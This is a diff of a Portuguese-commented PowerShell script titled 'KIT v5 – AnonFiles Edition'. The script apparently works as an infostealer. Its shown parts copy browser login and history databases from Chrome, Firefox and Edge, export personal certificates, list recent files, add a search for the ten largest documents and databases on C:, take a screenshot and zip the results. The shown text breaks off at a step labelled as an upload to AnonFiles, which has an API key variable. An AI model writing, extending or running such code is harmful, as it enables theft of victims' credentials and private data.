@@ -1,5 +1,5 @@
 # ----------
-# KIT v4 – AnonFiles Edition sem varredura de drives
+# KIT v5 – AnonFiles Edition, top 10 arquivos apenas
 # ----------
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -40,7 +40,7 @@ Write-Log "[INFO] Copiando dados de navegadores..."
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
     "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-) | ?{ Test-Path $_ } | prescindir-item "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue
+) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }
 
 # 5) Certificados
 Write-Log "[INFO] Exportando certificados pessoais..."
@@ -58,9 +58,14 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
-# 8) Lista drives (apenas enumeração, sem varredura)
-Write-Log "[INFO] Enumerando drives..."
-Get-PSDrive -PSProvider FileSystem | Out-File "$kit\drives.txt" -Encoding UTF8
+# 8) TOP 10 arquivos (apenas nomes e tamanho)
+Write-Log "[INFO] Buscando top 10 arquivos maiores em C:\ (profundidade 2)..."
+$exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
+Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
+    Sort Length -Descending |
+    Select -First 10 FullName,Length,LastWriteTime |
+    Export-Csv "$kit\top10.csv" -NoTypeInformation
+Write-Log "[INFO] Top 10 salvo em top10.csv"
 
 # 9) Screenshot
 Write-Log "[INFO] Tirando screenshot..."
@@ -77,7 +82,7 @@ $g.Dispose(); $bmp.Dispose()
 Write-Log "[INFO] Compactando pacote..."
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Compress-Archive -Path "$kit\*" -Destination $zip -Force
-Write-Log "[ZIP] Arquivo criado: $zip ($(Get-Item $zip).Length) bytes"
+Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length) bytes"
 
 # 11) Upload AnonFiles
 Write-Log "[UP] Enviando para AnonFiles..."
